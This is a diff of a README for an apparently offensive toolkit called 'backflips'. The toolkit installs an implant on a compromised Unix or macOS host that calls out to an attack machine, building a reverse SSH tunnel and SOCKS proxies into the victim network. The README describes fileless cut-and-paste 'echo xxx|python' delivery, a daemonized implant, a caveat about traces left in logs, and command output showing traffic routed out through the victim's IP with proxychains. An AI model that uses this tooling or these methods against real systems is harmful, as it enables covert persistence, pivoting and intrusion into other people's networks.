@@ -5,7 +5,12 @@ for a connection outbound from a compromised unix system to an attack
 machine that provides a reverse tunnel back into the attack machine's
 ssh server. It deploys keys to make this all possible.
 
+Linux backflips are in linux-ssh-backflips.
+
+OS X backflips are in osx-ssh-backflips.
+
 # Things to Take Note of
+
 * Port numbers for both reverse port forwards and socks proxies will
   need to be managed out of band. Implement a process and use it.
 * You are running an additional ssh server that your victims ssh
@@ -13,8 +18,8 @@ ssh server. It deploys keys to make this all possible.
   machine. While shell access is disabled, and only reverse forwarding
   will work, one should be aware of this caveat.
 
-
 # Components
+
 The structure here is a little confusing at first. Because we don't
 want to leave a script file on disk, we give cut-n-paste commands that
 are of the form `echo xxx|python`. The cut-n-paste command is
@@ -23,26 +28,30 @@ for the operator to understand what these scripts do on target, but
 the the scripts the operator directly uses are `make_backflip.py` and
 `install_autossh_backflip.py`
 
-## Components Directly Run
+## Linux backflips
 
 ### `make_backflip.py`
+
 runs on the attack machine that gives the cut-n-paste command to
 run on victim
 
-### `install_autossh_backflip.py`
-runs on attack machine and installs and starts a socks proxy into victim network
-
-## Components Indirectly Run
-
 ### `implant.py`
+
 embedded in `install_implant.py` that daemonizes and makes ssh
 connections. Note that the current implementation uses
 `subprocess.Popen` with `shell=True`, which will cause an `execve`
 with `sh -c` to appear in logs.
 
 ### `install_implant.py`
+
 template of script that will be encoded and outputed as the
 cut-n-paste command by `make_backflip.py`
+
+## Socks proxies over backflip
+
+### `install_autossh_backflip.py`
+
+runs on attack machine and installs and starts a socks proxy into victim network
 
 # How to Setup a Backflip
 
@@ -106,7 +115,7 @@ onwards and our socks proxies are on ports 5000 onwards
 		Created symlink /etc/systemd/system/multi-user.target.wants/backflip-4000-5000.service → /etc/systemd/system/backflip-4000-5000.service.
 
 	You can see that the proxy and ssh backflip are up:
-	
+
 		$ sudo netstat -lntp | grep -E "4000|5000"
 		tcp        0      0 0.0.0.0:4000            0.0.0.0:*               LISTEN      20612/sshd: flip
 		tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      20693/ssh
@@ -155,7 +164,7 @@ with contents as such:
 	strict_chain
 	# Quiet mode (no output from library)
 	#quiet_mode
-	proxy_dns 
+	proxy_dns
 
 	# Some timeouts in milliseconds
 	tcp_read_time_out 15000
@@ -170,7 +179,7 @@ victim IP instead of our attack IP:
 ```
 $ proxychains curl ifconfig.me; echo
 ProxyChains-3.1 (http://proxychains.sf.net)
-|DNS-request| ifconfig.me 
+|DNS-request| ifconfig.me
 |S-chain|-<>-127.0.0.1:5000-<><>-4.2.2.2:53-<><>-OK
 |DNS-response| ifconfig.me is 216.239.32.21
 |S-chain|-<>-127.0.0.1:5000-<><>-216.239.32.21:80-<><>-OK
